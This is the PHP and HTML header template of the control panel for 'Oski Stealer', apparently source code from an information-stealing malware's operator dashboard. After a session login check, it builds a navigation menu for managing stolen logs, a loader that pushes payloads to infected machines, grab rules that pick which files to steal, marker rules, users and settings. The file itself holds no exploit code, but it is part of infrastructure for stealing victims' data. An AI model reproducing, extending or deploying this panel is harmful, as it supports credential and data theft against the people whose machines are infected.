<?

// -------------------------------------------------------------------------
// auth checker
if($_SESSION["login"] != true)
{
	header('Location: login.php', true, 301);
	exit();
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	
	<title><? echo $pageID; ?> — Oski</title>
	
	<link href="Template/lib/fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
	<link href="Template/assets/css/prism-vs.css" rel="stylesheet">
	<link href="Template/assets/css/ion.rangeSlider.min.css" rel="stylesheet">
	<link href="Template/lib/fontawesome-free-5.11.2-web/css/all.css" rel="stylesheet">
	
	<link rel="stylesheet" href="Template/assets/css/dashforge.css">
	<link rel="stylesheet" href="Template/assets/css/dashforge.dashboard.css">
	<link rel="stylesheet" href="Template/assets/css/dashforge.demo.css">
	
	<script src="Template/lib/chart.js/Chart.bundle.min.js"></script>
	<script src="Template/lib/chart.js/Chart.js"></script>
	
	<script type="text/javascript" src="Template/lib/jquery/jquery.min.js"></script>
	
	<link rel="stylesheet" href="Template/lib/select2/css/select2.min.css">
    <link rel="stylesheet" href="Template/dashforge.css">
	
	<link id="dfMode" rel="stylesheet" href="Template/assets/css/skin.light.css">
	<link id="dfSkin" rel="stylesheet" href="Template/assets/css/skin.charcoal.css">

	<link href="Template/lib/noty/noty.css" rel="stylesheet">
	<link href="Template/lib/noty/themes/bootstrap-v4.css" rel="stylesheet">
	<script src="Template/lib/noty/noty.js" type="text/javascript"></script>
	
	<link rel="stylesheet" href="Template/jquery-ui.css">
	<script src="Template/jquery-1.12.4.js"></script>
	<script src="Template/jquery-ui.js"></script>
	<script src="Template/lib/select2/js/select2.min.js"></script>
	
	<script src="Template/lib/jquery-steps/jquery.steps.min.js"></script>
	<script src="Template/lib//numeric/jquery.numeric.js"></script>
	
	<link href="Template/lib/bootstrap-tagsinput/bootstrap-tagsinput.css" rel="stylesheet">
	<script src="Template/lib/bootstrap-tagsinput/bootstrap-tagsinput.js" type="text/javascript"></script>
</head>
<body class="page-profile">
	<header class="navbar navbar-header navbar-header-fixed">
		<a href="#" id="mainMenuOpen" class="burger-menu"><i class="fas fa-bars"></i></a>
		
		<div class="navbar-brand">
			<a href="dashboard.php" class="df-logo">Oski<span>Stealer</span></a>
		</div>
		
		<div id="navbarMenu" class="navbar-menu-wrapper">
			<div class="navbar-menu-header">
				<a href="dashboard.php" class="df-logo">Oski<span>Stealer</span></a>
				<a id="mainMenuClose" href="#"><i data-feather="x"></i></a>
			</div>
			
			<ul class="nav navbar-menu">
				<li class="nav-label pd-l-20 pd-lg-l-25 d-lg-none"> Navigation</li>
				<li class="nav-item <? if($pageID == "Dashboard") { echo "active"; } ?>"><a href="dashboard.php" class="nav-link"><i style="margin-right: 5px;" class="fas fa-chart-pie"></i>  Dashboard</a></li>
				<?
					if($_SESSION["user"]["logs"] ? true : false)
					{
						?><li class="nav-item <? if($pageID == "Logs") { echo "active"; } ?>"><a href="browse.php" class="nav-link"><i style="margin-right: 5px;" class="fas fa-folder-open"></i>  Logs</a></li><?
					}
				
					if($_SESSION["user"]["loader"] ? true : false)
					{
						?><li class="nav-item <? if($pageID == "Loader") { echo "active"; } ?>"><a href="loader.php" class="nav-link"><i style="margin-right: 5px;" class="fas fa-arrow-alt-circle-down"></i> Loader</a></li><?
					}
					
					if($_SESSION["user"]["grab"] ? true : false)
					{
						?><li class="nav-item <? if($pageID == "Grab Rules") { echo "active"; } ?>"><a href="grab.php" class="nav-link"><i style="margin-right: 5px;" class="fas fa-copy"></i>  Grab Rules</a></li><?
					}
					
					if($_SESSION["user"]["markers"] ? true : false)
					{
						?><li class="nav-item <? if($pageID == "Marker") { echo "active"; } ?>"><a href="marker.php" class="nav-link"><i style="margin-right: 5px;" class="fas fa-sticky-note"></i>  Marker Rules</a></li><?
					}
					
					if($_SESSION["user"]["users"] ? true : false)
					{
						?><li class="nav-item <? if($pageID == "Users") { echo "active"; } ?>"><a href="users.php" class="nav-link"><i style="margin-right: 5px;" class="fas fa-users"></i>  Users</a></li><?
					}
					
					if($_SESSION["user"]["settings"] ? true : false)
					{
						?><li class="nav-item <? if($pageID == "Settings") { echo "active"; } ?>"><a href="settings.php" class="nav-link"><i style="margin-right: 5px;" class="fas fa-cog"></i>  Settings</a></li><?
					}
				
				?>
				<li class="nav-item"><a href="exit.php" class="nav-link"><i class="fas fa-sign-out-alt"></i> Exit</a></li>
			</ul>
		</div>
		<div class="navbar-right">
		
		</div>
	</header>